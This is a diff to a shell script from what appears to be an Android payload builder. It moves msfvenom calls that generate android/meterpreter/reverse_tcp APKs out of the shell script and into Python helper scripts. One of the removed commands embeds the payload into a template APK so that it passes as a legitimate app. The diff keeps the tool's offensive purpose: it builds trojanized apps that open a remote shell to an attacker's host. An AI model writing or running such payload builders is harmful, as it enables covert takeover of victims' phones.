@@ -119,10 +119,10 @@ if [ "$action" = "1" ]; then
 	echo "\033[0;35m   [<Generating...>]\033[0m\033[0;37m\033[8m" # + Sets the terminal font color to invisable
 	# changes to the output directory.
 	cd output
-	# Runs the metasploit-framework command in a new xterm window.
-	xterm -e msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $output_name
-	# Changes one folder back.
-	cd ..
+	# Saves info to tmp textfiles for the python script
+	rm temp/outn.txt
+	touch temp/outn.txt
+	echo "$output_name" >> temp/outn.txt
 	# Creates temporary files that contains the users selected port and ip.
 	rm temp/user_ip.txt
 	touch temp/user_ip.txt
@@ -131,6 +131,10 @@ if [ "$action" = "1" ]; then
 	rm temp/user_port.txt
 	touch temp/user_port.txt
 	echo "$lport" >> temp/user_port.txt
+	# Runs the metasploit-framework command in a new xterm window via python.
+	python build_apk.py
+	# Changes one folder back.
+	cd ..
 	# clears the screen
 	clear
 	# Sets font back to 'normal'
@@ -184,10 +188,14 @@ elif [ "$action" = "2" ]; then
 	echo "\033[0;35m   [<Generating...>]\033[0m\033[0;37m" # + Sets the terminal font color to invisable
 	# changes to the output directory.
 	cd output
-	# Runs the metasploit-framework command in a new xterm window.
-	xterm -e msfvenom -x $template_name -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output_name
-	# Changes one folder back.
-	cd ..
+	# Saves info to tmp textfiles for the python script
+	rm temp/outn.txt
+	touch temp/outn.txt
+	echo "$output_name" >> temp/outn.txt
+
+	rm temp/inn.txt
+	touch temp/inn.txt
+	echo "$template_name" >> temp/inn.txt
 	# Creates temporary files that contains the users selected port and ip.
 	rm temp/user_ip.txt
 	touch temp/user_ip.txt
@@ -196,6 +204,10 @@ elif [ "$action" = "2" ]; then
 	rm temp/user_port.txt
 	touch temp/user_port.txt
 	echo "$lport" >> temp/user_port.txt
+	# Runs the metasploit-framework command in a new xterm window via python.
+	python build_oapk.py
+	# Changes one folder back.
+	cd ..
 	# clears the screen
 	clear
 	# Sets font back to 'normal'
